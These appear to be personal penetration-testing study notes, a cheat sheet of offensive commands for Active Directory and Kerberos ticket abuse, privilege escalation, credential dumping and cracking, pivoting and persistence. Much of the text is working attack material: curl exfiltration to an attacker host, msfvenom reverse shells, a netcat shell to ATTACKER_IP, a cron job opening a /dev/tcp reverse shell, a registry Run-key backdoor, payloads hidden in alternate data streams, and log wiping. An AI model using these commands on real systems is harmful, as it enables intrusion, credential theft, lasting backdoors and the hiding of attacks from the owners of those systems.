            [proxychains] Strict chain  ...  127.0.0.1:1080  ...  INLANEFREIGHT.HTB:88  ...  OK
            [!] Launching semi-interactive shell - Careful what you execute
            [!] Press help for extra shell commands
            C:\>whoami
            inlanefreight\julio
        + Note: If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.

    > Evil-Winrm

        + To use evil-winrm(https://github.com/Hackplayers/evil-winrm) with Kerberos, we need to install the Kerberos package used for network authentication. For some Linux like Debian-based (Parrot, Kali, etc.), it is called krb5-user. While installing, we'll get a prompt for the Kerberos realm. Use the domain name: INLANEFREIGHT.HTB, and the KDC is the DC01.

[+] Installing Kerberos Authentication Package
    m1l0js@htb[/htb]$ sudo apt-get install krb5-user -y
    > Default Kerberos Version 5 realm
        INLANEFREIGHT.HTB
    > The Kerberos servers can be empty.
    > Administrative Server for your Kerberos Realm
        DC01
    > In case the package krb5-user is already installed, we need to change the configuration file /etc/krb5.conf to include the following values:
    > Kerberos Configuration File for INLANEFREIGHT.HTB 
        m1l0js@htb[/htb]$ cat /etc/krb5.conf

        [libdefaults]
                default_realm = INLANEFREIGHT.HTB
        <SNIP>
        [realms]
            INLANEFREIGHT.HTB = {
                kdc = dc01.inlanefreight.htb
            }
        <SNIP>
    > Now we can use evil-winrm.
    > Using Evil-WinRM with Kerberos
        m1l0js@htb[/htb]$ proxychains evil-winrm -i dc01 -r inlanefreight.htb

[+] Miscellaneous

    > If we want to use a ccache file in Windows or a kirbi file in a Linux machine, we can use impacket-ticketConverter(https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py) to convert them. To use it, we specify the file we want to convert and the output filename. Let's convert Julio's ccache file to kirbi.
    > Impacket Ticket Converter
        m1l0js@htb[/htb]$ impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
        Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
        [*] converting ccache to kirbi...
        [+] done
    > We can do the reverse operation by first selecting a .kirbi file. Let's use the .kirbi file in Windows.
    > Importing Converted Ticket into Windows Session with Rubeus
        C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
        [*] Action: Import Ticket
        [+] Ticket successfully imported!
        C:\htb> klist
        Current LogonId is 0:0x31adf02
        Cached Tickets: (1)
        #0>     Client: julio @ INLANEFREIGHT.HTB
                Server: krbtgt/INLANEFREIGHT.HTB @ INLANEFREIGHT.HTB
                KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
                Ticket Flags 0xa1c20000 -> reserved forwarded invalid renewable initial 0x20000
                Start Time: 10/10/2022 5:46:02 (local)
                End Time:   10/10/2022 15:46:02 (local)
                Renew Time: 10/11/2022 5:46:02 (local)
                Session Key Type: AES-256-CTS-HMAC-SHA1-96
                Cache Flags: 0x1 -> PRIMARY
                Kdc Called:
        C:\htb>dir \\dc01\julio
         Directory of \\dc01\julio
        07/14/2022  04:18 PM                17 julio.txt

[+] Linikatz

    > Linikatz(https://github.com/CiscoCXSecurity/linikatz) is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory. In other words, Linikatz brings a similar principle to Mimikatz to UNIX environments.
    > Just like Mimikatz, to take advantage of Linikatz, we need to be root on the machine. This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with linikatz.. Inside this folder, you will find the credentials in the different available formats, including ccache and keytabs. These can be used, as appropriate, as explained above.
    > Linikatz Download and Execution
        m1l0js@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
        m1l0js@htb[/htb]$ /opt/linikatz.sh









###RCE
* In Burpsuite
	sleep+2 //The '+' is not necessary if you are in a browser
[+] Abusing curl
	Attack machine:
      		nc -lvnp 53
    	Victim machine
      		curl http://<attack machine IP>/53/`whoami | base64`
  	msfvenom -p linux/x64/shell_reverse_tcp LHOST=<our IP> LPORT=<our lport> -f elf -o reverse53
	create a python server from our machine
  	curl from victim machine and add '-o /tmp/r'. 
  	chmod +x /tmp/r

  	You can put files in a server with '-T'
    		A: nc -lvnp 53
    		V: curl http://<MY IP>/file -T /etc/issue
###Buffer overflow
	[+] A buffer is an area in the RAM reserved for temporary data storage. Buffers have a finite size; this means that they can only contain a certain amount of data. Buffers are stored in a special data structure in the computer memory called a stack (data structure used to store data). It uses LIFO (Last in First Out) with two methods:
  		> Push: Adds an element to the stack
  	  	> Pop: Removes the last inserted element
	
###General PrivEsc checklist
* Kernel exploits: Be careful for they cause system instability
* Vulnerable software
	> Linux 
		dpkg -l
	> Windows 
		C:\Program Files
* User privileges
	[+] Sudo: The sudo command in Linux allows a user to execute commands as a different user. It is usually used to allow lower privileged users to execute commands as root without giving them access to the root user. 
		sudo -l
			If 
				(ALL : ALL) ALL ==> It requires a password to run any commands with sudo
				sudo su -
			If 
				(user : user) NOPASSWD: /bin/echo ==> The NOPASSWD entry shows that the /bin/echo command can be executed without a password. This would be useful if we gained access to the server through a vulnerability and did not have the user's password. As it says user, we can run sudo as that user and not as root. 
				sudo -u user /bin/echo Hello world!

	> SUID
	> Windows Token privileges
	[+] Resources
		https://gtfobins.github.io/
		https://lolbas-project.github.io/#

* Scheduled tasks
	[+] Cronjobs
		/etc/crontab
		/etc/cron.d
		/var/spool/cron/crontabs/root
		
	> Looking into scheduledF)
		                    BUILTIN\Users:(I)(F)

	> As can be seen in the result, the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the .bat file and insert any payload we like. For your convenience, nc64.exe can be found on C:\tools. Let's change the bat file to spawn a reverse shell:
		C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
	> We then start a listener on the attacker machine on the same port we indicated on our reverse shell:
		nc -lvp 4444
	> The next time the scheduled task runs, you should receive the reverse shell with taskusr1 privileges. While you probably wouldn't be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, we have provided your user with permissions to start the task manually to save you some time. We can run the task with the following command:
		C:\> schtasks /run /tn vulntask
	> And you will receive the reverse shell with taskusr1 privileges as expected:
		user@attackerpc$ nc -lvp 4444
		Listening on 0.0.0.0 4444
		Connection received on 10.10.175.90 50649
		Microsoft Windows [Version 10.0.17763.1821]
		(c) 2018 Microsoft Corporation. All rights reserved.
		
		C:\Windows\system32>whoami
		wprivesc1\taskusr1
* Exposed credentials
	[+] Linux
		bash_history
	[+] Windows
		PSReadLine
* SSH Keys
	> If we have read access, we can copy id_rsa to our machine and use '-i' flag to log in with it
		vim id_rsa
		chmod 600 id_rsa
		ssh user@10.10.10.10 -i id_rsa
	> We may read their private key
		/home/user/.ssh/id_rsa
		/root/.ssh/id_rsa
	> If we find ourselves with write access to a users/.ssh/ directory, we can place our public key in the user's ssh directory at /home/user/.ssh/authorized_keys. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with ssh-keygen and the -f flag to specify the output file

###Windows Privilege Escalation
[+] Resources
	> PrivEsc Checklists
  		https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
		https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
	> Enumeration Scripts
		https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
		https://github.com/GhostPack/Seatbelt
		https://github.com/411Hall/JAWS
[+] Windows kernel
	> A kernel is a computer program that is the core of an operating system and has complete control over every resource and hardware on a system. It acts as a translation layer between hardware and software and facilitates the communication between these two layers
    	> Windows NT is the kernel that comes pre-packaged with all versions of Microsoft Windows and operates as a traditional kernel with a few exceptions based on user design philosophy. It consists of two main modes of operation that determine access to system resources and hardware:
      		+ User mode: Programs and services running in user mode have limited access to system resources and functionality
      		+ Kernel mode: Kernel mode has unrestricted access to system resources and functionality with the added functionality of managing devices and system memory.
[+] PowerShell-Empire
	> It is a pure PowerShell exploitation/post-exploitation framework built on cryptological-secure communications and flexible architecture
    	> Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from keyloggers to Mimikatz and adaptable communications to evade network detection, all wrapped up in a usability-focused framework
	> Starkiller is the GUI
    	> Usage
    		apt-get install powershell-empire starkiller -y
    	    	sudo powershell-empire server
    	    	sudo powershell-empire client
    	    		listeners
    	    	  	agents
    	    	starkiller (Default credentials: empireadmin:password123)
    
[+] Github tools
	https://github.com/AonCyberLabs/Windows-Exploit-Suggester
      	  systeminfo in the target machine and copy it to a .txt
      	  ./windows-exploit-suggester.py --update
      	  ./windows-exploit-suggester.py --database *.mssb.xls --systeminfo win7.txt
      	https://github.com/SecWiki/windows-kernel-exploits
      
[+] Saved windows credentials
    	cmdkey /list
    	runas /savecred /user:username cmd.exe
[+] Bypassing UAC with UACMe 
	In order to successfully bypass UAC, we will need to have access to a user account that is a part of the local administrators group on the Windows target system.
    	UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation.
[+] Metasploit
	search suggester
          use post/multi/recon/local_exploit_suggester
[+] Example with Metasploit
	setg rhosts 10.2.22.220
      	use exploit/windows/http/rejetto_hfs_exec
      		sysinfo
      	  	pgrep explorer
      	  	migrate 2448
      	  	sysinfo
      	  	getuid
      	  	getprivs
      	  	shell
      	  		net user m1l0js
      	  	  	net localgroup administrators
      	  	  	net user admin password123
      	  	  	(Not allowed)
      	  https://github.com/hfiref0x/UACME
      	  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f exe > backdoor.exe
      	  msfconsole
      		use multi/handler //Listening for new connections
      	    	set payload windows/meterpreter/reverse_tcp
      	  msfconsole 
      		cd C:\\ 
      	    	mkdir Temp
      	    	upload backdoor.exe
      	    	upload /root/Desktop/tools/UACME/Akagi64.exe
      	    	.\Akagi64.exe 23 C:\Temp\backdoor.exe

[+] Access Token Impersonation
    + Windows access tokens are created and managed by the Local Security Authority Subsystem Service (LSASS)
    + Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.
    + An access token will typically be assigned one of the following security levels:
      	> Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
        	Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.
        	We can use the incognito module to display a list of available tokens that we can impersonate.
        	The following are the privileges that are required for a successful impersonation attack:
        	  - SeAssignPrimaryToken: This allows a user to impersonate tokens
        	  - SeCreateToken: This allows a user to create an arbitrary token with administrative privileges
        	  - SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges.
      	> Delegate-level tokens are typically created through an interactive login on Windows, primarily through a traditional login or through remote access protocols such as RDP
        	Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.
    + Load incognito
	> Incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation
      		list_tokens -u 
      		impersonate_token "ATTACKDEFENSE\Administrator"
      		getuid
      		getprivs
      		pgrep explorer
      		(finish it)
[+] Windows File system vulnerabilities --> ME INTERESA
* Alternate Data Streams
	> ADS is an NTFS(New Technology File System) file attribute and was designed to provide compatibility with the MacOS HFS(Hierarchical File System).
    	  Any file created on an NTFS formatted drive will have two different forks/streams:
		Data stream: Default stream that contains the data of the file
    	 	Resource stream: Typically contains the metadata of the file
    	> Attackers can use ADS to hide malicious code or executables in legitimate files in order to evade basic signature based AVs and static scanning tools. This can be done by storing the malicious code or executables in the file attribute resource stream (metadata) of a legitimate file. 
    	> notepad test.txt:secret.txt 
    	> change name winpeas.exe to payload.exe
    	> type payload.exe > windowslog.txt:winpeas.exe
    	> start windowslog.txt:winpeas.exe
    	> cd Windows\System32
    	> mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
    	> wupdate

[+] Windows Credential Dumping
	+ Windows Password Hashes
  		> Windows OS stores hashed user accounts and passwords locally in the SAM(Security Accounts Manager) database
  	  		The SAM database file cannot be copied while the operating system is running
  	  	    	The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.
  	  	    	In modern versions of Windows, the SAM database is encrypted with a syskey.
  	  	> Authentication and verification of user credentials is facilitated by the LSA (Local Security Authority)
  	  		Elevated/Administrative privileges are required in order to access and interact with the LSASS process 
  	  	    	This service has a cache of memory with the hashes as it interacts with the SAM database
  	  	> Windows disables LM hashing and utilizes NTLM hashing from Windows Vista onwards
    
	+ LM(LanMan)
		Default hashing algorithm that was implemented in Windows OS prior to NT4.0
      		[+] The password is broken into two seven-character chunks 
      		[+] All characters are then converted into uppercase
      		[+] Each chunk is then hashed separately with the DES algorithm.
      		> Weak protocol, primarily because the password hash does not include salts, consequently making brute-force and rainbow table attacks effective against LM hashes
      		> Example: Password123 => PASSWO ==> RD123 ==> DES ==> HASH1 + HASH2 ==> LM Hash

	+ NTLM(NTHash)
		When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.
      		[+] Does not split the hash in to two chunks
      		[+] Case sensitive 
      		[+] Allows the use of symbols and unicode characters
      		[+] They do not have password salts, which means that can be cracked easy with rainbow tables or through brute-force attacks
      		> Example: !Passw0rd123. ==> MD4 ==> NTLM hash
[+] Searching for passwords in Windows Configuration files
	+ Unattended Windows Setup utility
		Windows can automate a variety of repetitive task(such as the installation of Windows on many systems) typically done through the use of the Unattended Windows Setup utility. 
      		This tool utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account's password
      			[+] C:\Windows\Panther\Unattend.xml
      			[+] C:\Windows\Panther\Autounattend.xml
      		As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64
      	+ Example done by 2 ways:
      		msfconsole -q
      		use exploit/windows/misc/hta_server
      		exploit
      		“This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell". Copy the generated payload i.e “http://10.10.0.2:8080/6Nz7aySfPN.hta” and run it on cmd.exe with mshta command to gain the meterpreter shell
        	Use your own metasploit HTA server link
            	mshta.exe http://10.10.0.2:8080/6Nz7aySfPN.hta
		msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > payload.exe
        	python3 -m http.server 80
        	VM: certutil -urlcache -f http://10.10.5.2/payload.exe payload.exe
        	msfconsole 
        		use multi/handler
        	  	set payload windows/x64/meterpreter/reverse_tcp
        	  	meterpreter > search -f Unattend.xml
        	  	psexec.py Administrator@10.2.27.165

		Utilizing PowerUp.ps1
			. .\PowerUp.ps1
        		Invoke-PrivescAudit
        		How to base64 decode in Powershell?
        			$password=QWRtaW5AMTIz
        		  	$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
        		  	echo $password
        		How to run a command as other user?
        		  	runas.exe /user:administrator cmd

[+] Dumping hashes with kiwi or mimikatz
	> The SAM (Security Account Manager) database, is a database file on Windows systems that stores hashes user passwords.
    	> Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are cached.
    	> We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.
    	> Mimikatz will require elevated privileges in order to run correctly.

    	> Example:
    		nmap 192.168.188.128
    	    	service postresql start && msfconsole -q 
    	    	use exploit/windows/http/badblue_passthru
    	    	sysinfo
    	    	getuid
    	    	pgrep lsass
    	    	migrate 788
    	    	getuid
		> Usage of Kiwi
    	    		load kiwi
    	    			creds_all
    	    		  	lsa_dump_sam
    	    		  	lsa_dump_secrets //Some clear password sometimes
		> Usage of mimikatz.exe
    	    		pwd
    	    		cd C:\\
    	    		mkdir Temp
    	    		cd Temp
    	    		upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
    	    		.\mimikatz.exe
    	    		  privilege::debug //To ensure that we have enough privileges
    	    		  lsadump::sam
    	    		  lsadump::secrets
    	    		  sekurlsa::logonpasswords //Clear passwords

[+] Pass-The-Hash attack
	> We can use multiple tools to facilitate this attack like Metasploit PsExec module or Crackmapexec
	> Metasploit PsExec module 
    		use exploit/windows/smb/psexec
    			set smbuser administrator
    	      		set smbpass (Paste LM:NTLM or the clear password)
    	      		set target Command
    	      		set target Native\ upload
    	      		sessions -K //To kill all the sessions
	> Crackmapexec 
    		crackmapexec smb 192.168.188.126 -u Administrator -H "(NTLM hash here)"
    	    	crackmapexec smb 192.168.188.126 -u Administrator -H "(NTLM hash here)" -x "ipconfig"
    	    	crackmapexec smb 192.168.188.126 -u Administrator -H "(NTLM hash here)" -x "net user administrator password123."


          

##Post-Exploitation
* Methodology
	1. Local Enumeration
		Enumerating System information
	    	Enumerating Users & Groups
	    	Enumerating Network Information
	    	Enumerating Services
	    	Automating Local Enumeration
	2. Transferring files
		Setting up a web server with Python
	    	Transferring files to windows targets
	    	Transferring files to linux targets
	3. Upgrading shells
		Upgrading command shells to meterpreter
	    	Spawning tty shells
	4. Privilege escalation
		Identifying PrivEsc Vulns
	    	Windows PrivEsc
	    	Linux PrivEsc
	5. Persistence
	    	Setting Up Persistence On Windows
	    	Setting Up Persistence On Linux
	6. Dumping & Cracking hashes
	    	Dumping & Cracking Windows Hashes
	    	Dumping & Cracking Linux Hashes
	7. Pivoting
	    	Internal Network Recon
	    	Pivoting
	8. Clearing tracks
	    	Clearing your tracks on Windows & Linux

* Windows Enumeration
    Windows Local Enumeration
      Enumerating System information
        We are looking for:
          - Hostname
          - OS Name(Windows 7,8,etc)
          - OS Build & Service Pack (Windows 7 SP1 7600)
          - OS Architecture (x64/x86)
          - Installed updates/Hotfixes
        meterpreter >
          getuid //Current user
          sysinfo
        shell >
          hostname
          systeminfo
          wmic qfe get Caption,Description,HotFixID,InstalledOn //Security Update
          cat C:\Windows\System32\eula.txt

      Enumerating Users & Groups
        We are looking for:
          - Current user & privileges
          - Additional user information
          - Other users on the system
          - Groups
          - Members of the built-in administrator group
        //The windows Administrator account is disabled by default unless it is explicitly enabled.
        meterpreter >
          getuid
          getprivs
          search logged_on //Enumerate current and recently logged users
        shell >
          whoami
          whoami /priv
          query user //Seet what users are logged on in addition to you
          net users
          net user administrator //Know more about a user
          net localgroup
          net localgroup administrators //Know the members of this group
      Enumerating Network Information
        We are looking for:
          - Current IP address & network adapter
          - Internal networks
          - TCP/UDP services running and their respective ports
          - Other hosts on the network
          - Routing table
          - Windows Firewall state
        shell > 
          ipconfig /all
          route print
          arp -a
          netstat -ano
          netsh firewall show state or netsh advfirewall firewall 
          netsh advfirewall show allprofiles
      Enumerating Processes & Services
        We are looking for:
          - Running processes & services
          - Scheduled tasks
        > A process is an instance of a running executable(.exe) or program
        > A service is a process which runs in the background and does not interact with the desktop
        meterpreter >
          ps 
          pgrep explorer.exe
          migrate 2176 //You can only migrate to a different process if you have an elevated session on the target system
        shell >
          net start //Services running in the background
          wmic service list brief
          tasklist /svc //List services running under that particular process
          schtasks /query /fo list /v
      
      Automating Windows Local Enumeration
        https://github.com/411Hall/JAWS //It should run on every Windows version since Windows 7
        meterpreter > 
          show_mount
        search win_privs
        search enum_logged_on_users 
        search checkvm
        search enum_applications //Applications installed
        search enum_computers //Is the host part of a domain
        search enum_patches //Patches installed
        search enum_shares
        powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
    Linux Local enumeration
      Enumerating system information
        We are looking for: 
          - Hostname
          - Distribution & distribution release version
          - Kernel version & architecture
          - CPU information
          - Disk information & mounted drives
          - Installed packages/software
        bash > 
          hostname
          cat /etc/issue
          cat /etc/*release
          uname -a
          env //Enviromental variables
          lscpu
          free -h //Hos many RAM is consumed
          df -h
          df -ht ext4 
          lsblk | grep sd //Storage devices
          dpkg -l
    Enumerating users & groups
      groups
      groups bob
      cat /etc/passwd 
      useradd -m bob -s /bin/bash 
      usermod -aG root bob //To which group and who user?
      w or who 
      last //by ssh or console
      lastlog  //List of users of have recently logged in to the system
    Enumerating Network Information
      We are looking for:   
        - Current IP address & network adapter
        - Internal networks
        - TCP/UDP services running and their respective ports
        - Other hosts on the network
      meterpreter >
        ifconfig
        netstat 
        route
        arp
      shell > 
        ip a 
        cat /etc/networks //List of interfaces 
        cat /etc/hostname
        cat /etc/hosts
        cat /etc/resolv.conf //DNS server by default
        arp -a
    Enumerating processes & cron jobs
      We are looking for:
        - Running services
        - Cron jobs
      msfconsole >
        ps
      shell >
        ps
        ps aux
        top
        crontab -l
        ls -la /etc/cron* //Display all cron jobs
    Automating Linux Local Enumeration
      search enum_configs
      search enum_network
      search enum_system
      search checkvm
      https://github.com/rebootuser/LinEnum

Transferring files to Windows & Linux targets
* Using python server
	Setting up a web server with Python
	    Python2 ==> SimpleHTTPServer
	    Python3 ==> http.server
	Transferring files to windows targets
  	  certutil -urlcache -f http://10.10.4.2/mimikatz.exe mimikatz.exe
  	Transferring files to Linux targets
  	  cd /tmp
  	  cd /usr/share/webshells/php/
  	  python3 -m http.server 80
  	  wget http://10.10.3.4/php-backdoor.php
    		If the remote server does not have wget, we can use cURL to download the file:
			curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
* Using scp
	Granted we have obtained ssh user credentials on the remote host.
		scp linenum.sh user@remotehost:/tmp/linenum.sh
* Using base64
	Maybe, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. For example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:
		base64 shell -w 0
	Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file
		echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
	Finally, we can use md5sum to ensure that the file not mess up
	

Shells
  Upgrading non-interactive shells (Linux post exploitation)
    //Which shells the system has?
      cat /etc/shells
    Is python installed?
      python --version
      python -c 'import pty; pty.spawn("/bin/bash")'
    Is perl installed?
      perl -e 'exec "/bin/bash";'
      perl: exec "/bin/bash";
    Is ruby installed?
      ruby: exec "/bin/bash"
  Now, check the environmental variables
    env
    export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    export TERM=xterm
    export SHELL=bash

Escalation
  Windows privilege escalation
    Identifying windows privilege escalation vulnerabilities
      https://github.com/itm4n/PrivescCheck
      use exploit/multi/script/web_delivery
        set target PSH\ (Binary)
        set payload windows/shell/reverse_tcp
        set PSH-EncodedCommand false
      //Upgrade normal shell to meterpreter
        set WIN_TRANSFER VBS
      //Once we have access we can use PrivescCheck
          powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
          runas.exe /user:administrator cmd
      //In our machine
        //This module hosts an HTML Application (HTA) that when opened will run a payload via
Powershell
        use exploit/windows/misc/hta_server
      //In victim
        mshta.exe http://10.10.15.2:8080/jxEyD3w.hta

    Windows Privilege escalation
      //Supose that we have obtained valid credentials. After obtaining user account credentials, what protocols can we use to authenticate with the Windows target 
      //Without Metasploit
        psexec.py administrator@10.10.5.10 
      //With Metasploit
        use exploit/windows/smb/psexec
          set smbuser 
          set smbpass
            
Linux Privilege Escalation
	> PrivEsc Checklists
		https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
		https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
	> Enumeration Scripts
		https://github.com/rebootuser/LinEnum.git
		https://github.com/sleventyeleven/linuxprivchecker
		https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
		
  Weak Permissions
    cat /etc/passwd
    cat /etc/groups 
    groups student
    find / -not -type l -perm -o+w
    // /etc/shadow is writable
      openssl passwd -1 -salt abc password //-1 is the lower level of hash
      vim /etc/shadow
  SUDO privileges
    sudo -l
        
Persistence
    Windows Persistence
        Persistence Via Services
            msfconsole -q 
                ps -S explorer.exe
                migrate 3124
                search persistence_service
                use multi/handler
                    set payload windows/meterpreter/reverse_tcp
        Persistence via RDP
            meterpreter >
                run getgui -e -u m1l0js -p m1l0js_123321
                //getgui command makes the below changes to the target machine
                ● Enable RDP service if it’s disabled
                ● Creates new user for an attacker
                ● Hide user from Windows Login screen
                ● Adding created user to "Remote Desktop Users" and "Administrators" groups
            //Now we can access via RDP
            xfreerdp /u:m1l0js /p:m1l0js_123321 /v:10.2.18.93
            //Think as a red teamer and create a user like guest instead of the normal Guest

    Linux persistence
        Persistence via SSH Keys
            //In most cases Linux servers will have key-based authentication enabled for the SSH service, allowing users to access the Linux system remotely without the need for a password
            // After gaining access to a Linux system, we can transfer the SSH private key of a specific user account to our system and use that SSH private key for all future authentication and access
            scp student@192.63.238.3:~/.ssh/id_rsa .
            chmod 400 id_rsa
            ssh -i id_rsa student@192.63.238.3
          Create a ssh key pair
            ssh-keygen -v 4096
            //Pass your id_rsa.pub
              ssh-copy-id root@10.10.13.4
            //At this moment, authorized keys exists
        Persistence via Cron Jobs
          Cron jobs = schedule tasks(Windows)
          * * * * * command to execute
          min(0-59)
          hour(0-23)
          day of month(1-31)
          month(1-12)
          day of week(0-7)
          //Example
            echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/1234 0>&1'" > cron
            crontab -l  //List cron jobs
            crontab -i cron //Include our cron job
          //Other example
            echo " * * * * * cd /home/student/ && python3 -m http.server 8000" > cron
            crontab -i cron
            crontab -l

Dumping & Cracking 
  Dumping & cracking NTLM hashes(Windows)
    meterpreter >
      pgrep lsass 
      migrate 708
      hashdump //List NTLM hashes
    //Crack it with meterpreter
      use auxiliary/analyze/crack_windows
    //Crack it with John
      john --list=formats
      john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
    //Crack it with hashcat
      hashcat -a 3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
    
  Dumping & cracking Linux password hashes
    use exploit/unix/ftp/proftpd_133c_backdoor
    use post/linux/gather/hashdump
    //Crack it with john
      john --format=sha512crypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
      john --show
    //Crack it with hashcat
      hashcat --help | grep 1800
      hashcat -a 3 -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt

Pivoting
  meterpreter > 
    run autoroute -s 10.0.29.0/20 
    run autoroute -p //List active routing table
  use auxiliary/scanner/portscan/tcp
  meterpreter >
    portfwd add -l 1234 -p 80 -r 10.0.29.96
  use badblue_passthru 
    set payload windows/meterpreter/bind_tcp


Clearing your tracks
  Windows
    use exploit/windows/local/persistence_service 
      resource ....rc //It will clear the traces and the .exe generated with this module
    meterpreter > 
      clearev

  Linux
    history -c 
    cat /dev/null  > bash_history
###Persistence
* What if we have to be persistent?
	[+] Using netcat
		We need to modify the regedit
      			1. Go to Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 
      		  	2. New ==> String ==> Type the name of the netcat file (for example winconfig)
      		  	3. Edit string ==> Value data ==> "C:\Windows\System32\winconfig.exe 192.168.0.10 4126 -e cmd.exe"

	[+] Using Metasploit
  		use exploit/windows/local/s4u_persistence
  	  	show options
  	  	sessions
  	  	set session 2
  	  	set trigger logon
  	  	set payload windows/meterpreter/reverse_tcp
  	  	set lhost 192.168.0.10
  	  	set lport 4126
  	  	show options
  	  	exploit
###Lateral Movement 
* How to pivot into networks?
	[+] Using Metasploit
		Add a route
			run autoroute -h
      			2 different ways 
      				> run autoroute -s 192.222.74.0/24 or run autoroute  -s 192.222.74.0 -n 255.255.255.0
      			  	> route add 192.222.74.0 255.255.255.0 1(meterpreter session ID)
      			background
      			route print

    		use exploit/multi/handler
    		set paload windows/meterpreter/reverse_tcp
    		show options
    		set lport 4126
    		screenshot
    		download personal_information.txt /root/Desktop
    		upload ..
    		sysinfo
    		ps

###Password attacks
* When you log into your computer, you type your username and password. The operating system takes the password, hashes it and then tries to match the result against the saved hash in the password database. If the two values match, you log in successfully. The operating system does not need to know the clear-text password.

* John the Ripper 
	[+] List of accepted formats
		john --list=formats
    	[+] To perform a pure brute force attack over a users list:
    		john --incremental --users:<users list> <file to crack>
    		john --wordlist=rockyou.txt --rules --users=victim1,victim2 hash //Other way
    	[+] Using single crack mode
    		john --single --format=[format] [path to file]
            john --single --format=sha256 hashes_to_crack.txt
    	[+] To display the password recovered:  
    		john --show crackme
    	[+] Default file where the cracked passwords are stored by John
    		/root/.john/john.pot
    	[+] It is a good idea if we are in Linux to check the 
    		/etc/login.defs to see the hash algorithm used to hash the password present in the shadow file
    	[+] Cool features
		/usr/share/john/office2john.py when .docx documents
    	[+] Unshadowing
    		unshadow - Invokes the unshadow tool
    	  	unshadow [path to passwd] [path to shadow] > crackme.txt
    	  	[path to passwd] - The file that contains the copy of the /etc/passwd file you've taken from the target machine
    	  	[path to shadow] - The file that contains the copy of the /etc/shadow file you've taken from the target machine 
        [+] --rules ==> to generate further candidate passwords
        
    	
* Rainbow table
	[+] It is a table containing links between the results of a run of one hashing function and another.
	[+] For Windows ==> ophcrack.

* Hashcat 
	[+] Relies in GPU instead of CPU
	[+] List of accepted formats
		hashcat --example-hashes

	[+] First steps
    		hashcat -b //First step
    		hashcat -m 0 -a 0 -D2 example.hash example.dict

	[+] Rules file
    		--rules-file ==> check it in hashcat page
  	[+] URLs
  		https://wiki.skullsecurity.org/index.php/Passwords //Other 



  

          

Windows Black Box Penetration Test
  Port scanning & enumeration
  Targeting Microsoft IIS FTP
